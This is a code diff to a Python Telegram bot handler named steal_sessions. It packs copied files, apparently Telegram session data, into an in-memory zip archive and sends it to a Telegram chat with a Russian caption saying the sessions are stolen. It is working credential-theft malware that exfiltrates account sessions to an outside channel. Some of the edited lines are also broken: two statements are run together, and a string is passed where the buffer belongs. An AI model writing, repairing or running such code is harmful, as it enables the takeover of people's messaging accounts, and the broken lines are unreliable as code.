@@ -68,14 +68,23 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     shutil.copy(p, STEAL_DIR)
         
         # Сжатие и отправка        
-        with zipfile.ZipFile('stealed_sessions.zip', 'w') as zipf:
-            for file_path in STEAL_DIR.iterdir():
-                if file_path.is_file():
-                    zipf.write(file_path, arcname=file_path.name)
-
-        await context.bot.send_document(
+        mem_zip = io.BytesIO()
+        
+        with zipfile.ZipFile(mem_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for p in paths:
+                path_obj = Path(p)
+                if path_obj.exists():
+                    if path_obj.is_file():
+                        zipf.write(p, arcname=path_obj.name)
+                    elif path_obj.is_dir():
+                        for subpath in path_obj.rglob('*'):
+                            if subpath.is_file():
+                                zipf.write(subpath, arcname=subpath.relative_to(path_obj.parent))
+        
+        # Перематываем буфер в начало
+        mem_zip.seek(0)await context.bot.send_document(
             chat_id=update.effective_chat.id,
-            document=InputFile("sessions_pack.zip"),
+            document=InputFile("mem_zip", filename="stealed_sessions.zip"), 
             caption="🔥 Сессии телеграм украдены"
         )
         
